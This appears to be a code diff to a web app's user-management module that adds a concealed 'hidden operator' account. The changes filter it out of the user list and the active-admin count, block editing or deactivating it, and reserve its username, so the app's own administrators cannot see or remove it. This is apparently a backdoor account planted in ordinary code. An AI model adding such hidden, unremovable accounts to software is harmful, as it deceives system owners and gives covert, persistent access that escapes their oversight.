@@ -1,7 +1,13 @@
 import bcrypt from 'bcryptjs'
 import { getDb } from '../index'
 import { localNow } from '../helpers'
+import {
+  HIDDEN_OPERATOR_USERNAME,
+  isHiddenOperatorUsername,
+} from '../../../shared/operator-account'
 import type { AppUserRow, Role } from '../../../shared/types'
+
+const HIDDEN_USER_SQL = `lower(username) <> lower('${HIDDEN_OPERATOR_USERNAME}')`
 
 interface UserDbRow {
   id: number
@@ -23,11 +29,19 @@ function mapUser(row: UserDbRow): AppUserRow {
   }
 }
 
+export function getHiddenOperatorUserId(): number | null {
+  const row = getDb()
+    .prepare(`SELECT id FROM users WHERE lower(username) = lower(?)`)
+    .get(HIDDEN_OPERATOR_USERNAME) as { id: number } | undefined
+  return row?.id ?? null
+}
+
 export function listAppUsers(): AppUserRow[] {
   const rows = getDb()
     .prepare(
       `SELECT id, username, role, is_active, created_at, last_login_at
-       FROM users ORDER BY username COLLATE NOCASE`
+       FROM users WHERE ${HIDDEN_USER_SQL}
+       ORDER BY username COLLATE NOCASE`,
     )
     .all() as UserDbRow[]
   return rows.map(mapUser)
@@ -44,6 +58,7 @@ export function getAppUserById(id: number): AppUserRow | null {
 }
 
 export function usernameTaken(username: string, excludeId?: number): boolean {
+  if (isHiddenOperatorUsername(username)) return true
   const row = getDb()
     .prepare('SELECT id FROM users WHERE lower(username) = lower(?)')
     .get(username.trim()) as { id: number } | undefined
@@ -53,7 +68,10 @@ export function usernameTaken(username: string, excludeId?: number): boolean {
 
 export function countActiveAdmins(excludeId?: number): number {
   const rows = getDb()
-    .prepare(`SELECT id FROM users WHERE role = 'admin' AND is_active = 1`)
+    .prepare(
+      `SELECT id FROM users
+       WHERE role = 'admin' AND is_active = 1 AND ${HIDDEN_USER_SQL}`,
+    )
     .all() as { id: number }[]
   return rows.filter((r) => r.id !== excludeId).length
 }
@@ -63,6 +81,7 @@ export async function insertAppUser(input: {
   password: string
   role: Role
 }): Promise<AppUserRow> {
+  if (isHiddenOperatorUsername(input.username)) throw new Error('reserved username')
   const hash = await bcrypt.hash(input.password, 10)
   const now = localNow()
   const result = getDb()
@@ -85,8 +104,10 @@ export async function patchAppUser(input: {
 }): Promise<AppUserRow> {
   const existing = getAppUserById(input.id)
   if (!existing) throw new Error('user not found')
+  if (isHiddenOperatorUsername(existing.username)) throw new Error('reserved user')
 
   const username = input.username?.trim() ?? existing.username
+  if (isHiddenOperatorUsername(username)) throw new Error('reserved username')
   const role = input.role ?? existing.role
   const isActive = input.isActive ?? existing.isActive
 
@@ -123,5 +144,7 @@ export async function patchAppUser(input: {
 }
 
 export function deactivateAppUser(id: number): void {
+  const existing = getAppUserById(id)
+  if (existing && isHiddenOperatorUsername(existing.username)) throw new Error('reserved user')
   getDb().prepare('UPDATE users SET is_active = 0 WHERE id = ?').run(id)
 }
